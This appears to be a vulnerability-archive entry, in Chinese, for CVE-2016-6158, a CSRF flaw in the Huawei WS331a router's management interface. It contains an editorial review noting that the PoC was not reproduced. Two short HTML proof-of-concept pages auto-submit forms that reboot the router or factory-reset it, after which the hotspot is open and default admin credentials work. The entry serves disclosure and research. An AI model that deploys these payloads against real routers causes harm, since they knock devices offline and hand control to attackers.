---
cve: "CVE-2016-6158"
source: "Mr-xn/Penetration_Testing_POC"
id: "vw-f8c12317a27666ca0281d7a6"
entity_id: "ve-f8c12317a27666ca0281d7a6"
schema_version: "1"
title: "华为WS331a产品管理页面存在CSRF漏洞"
product: "Huawei WS331a"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2016-6158"
referenced_identifiers: ""
prerequisites: "WS331a-10 V100R001C02B017SP01及之前；管理员已登录并访问攻击页面，可达192.168.3.1"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Huawei/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# 华为WS331a产品管理页面存在CSRF漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Huawei WS331a
- 本文讨论：CVE-2016-6158 重启/恢复出厂CSRF
- 版本、权限与配置前提：WS331a-10 V100R001C02B017SP01及之前；管理员已登录并访问攻击页面，可达192.168.3.1
- 资料类型：CSRF PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 两个动作应作为同CSRF不同影响保留
- amdin/admin明显用户名拼字错误；恢复出厂后无线开放与凭据需机型配置验证
- 没有修复版本或厂商公告直链，元数据版本未提取

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- HWPSIRT-2016-07078与默认重置行为待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|华为WS331a产品管理页面存在CSRF漏洞|2016-09-07|zixian（me@zixian.org）|[http://www.huawei.com/](http://www.huawei.com/) | [http://www.huawei.com/](http://www.huawei.com/) |WS331a-10 V100R001C02B017SP01及之前版本 | [CVE-2016-6158](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6158)|  

#### 漏洞概述  

> 华为WS331a 是一款便携无线路由器。
WS331a产品的管理页面中存在一个CSRF漏洞，未经过认证的攻击者可以利用此漏洞发起CSRF攻击。成功利用此漏洞，攻击者可以向受影响设备提交特定请求进而导致设备恢复出厂设置或者重启。 (漏洞编号:HWPSIRT-2016-07078)
此漏洞的CVE编号为：CVE-2016-6158。  


### POC实现代码如下：  

> 当管理员登陆后，打开如下poc页面，WS331a设备将重启。
``` html
<form action="http://192.168.3.1/api/service/reboot.cgi" method="post">
</form>
<script> document.forms[0].submit(); </script>
```
> 当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。   

```html
<form action="http://192.168.3.1/api/service/restoredefcfg.cgi" method="post">
</form>
<script> document.forms[0].submit(); </script>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
